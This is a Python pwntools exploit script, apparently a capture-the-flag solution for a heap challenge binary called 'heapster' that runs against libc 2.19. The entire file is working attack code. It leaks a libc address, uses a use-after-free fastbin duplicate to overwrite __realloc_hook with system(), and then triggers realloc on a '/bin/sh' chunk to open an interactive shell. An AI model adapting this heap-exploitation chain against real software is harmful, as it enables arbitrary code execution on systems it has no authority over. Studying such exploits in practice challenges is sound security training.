from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = 'debug'

libc_file = "libc-2.19.so"
file = "./heapster"

libc = ELF(libc_file)
bin = ELF(file)

env = {"LD_PRELOAD": os.path.join(os.getcwd(), libc_file)}

conn = process(file, env=env)
gdb.attach(conn)

def malloc(size):
    conn.recvuntil("cmd>> ")
    conn.sendline("0")
    conn.recvuntil("size>> ")
    conn.sendline(str(size))
    conn.recvuntil("= ")
    return conn.recvline().strip()

def realloc(addr, size, shell=True):
    conn.recvuntil("cmd>> ")
    conn.sendline("1")
    conn.recvuntil("addr>> ")
    conn.sendline(addr)
    conn.recvuntil("size>> ")
    conn.sendline(str(size))
    if shell:
        return
    conn.recvuntil("= ")
    return conn.recvline().strip()

def free(addr):
    conn.recvuntil("cmd>> ")
    conn.sendline("2")
    conn.recvuntil("addr>> ")
    conn.sendline(addr)

def fill(addr, data):
    conn.recvuntil("cmd>> ")
    conn.sendline("3")
    conn.recvuntil("addr>> ")
    conn.sendline(addr)
    conn.recvuntil("data>> ")
    str = ""
    for ch in data:
        str += ch.encode('hex') + " "
    str = str.strip()
    conn.sendline(str)

def dump(addr):
    conn.recvuntil("cmd>> ")
    conn.sendline("4")
    conn.recvuntil("addr>> ")
    conn.sendline(addr)
    data = conn.recvline().strip()
    data = data.replace(' ', '').decode('hex')
    return data

# Libc leaking

a = malloc(0x80)
b = malloc(0x80)
free(a)
a = malloc(0x80)
libc_leak = u64(dump(a)[0:6] + "\x00\x00")

log.info(hex(libc_leak))

libc_base = libc_leak - 0x7ff44132a7b8 + 0x7ff440f69000
#libc_base = libc_leak - 0x7f6281f67b78 + 0x7f6281ba3000
# 0x7f73ac3497b8

# Clearing
free(a)
free(b)

# Fastbin dup - use after free

a = malloc(0x80)
b = malloc(0x80)
c = malloc(0x60)
free(c)
realloc(a, 0x80) # Now can use c

realloc_hook_chunk = libc_base + libc.symbols['__realloc_hook'] - 0x10 - 3
fill(c, p64(realloc_hook_chunk).ljust(0x60, "\x00"))

d = malloc(0x60)
e = malloc(0x60)

payload = "\x00"*3 + p64(libc_base + libc.symbols['system'])
fill(e, payload.ljust(0x60, "\x00"))
log.info(hex(libc_base))
fill(d, "/bin/sh".ljust(0x60, "\x00"))

realloc(d, 0x60, shell=True)

log.info("Libc leak: " + hex(libc_leak))

conn.interactive()
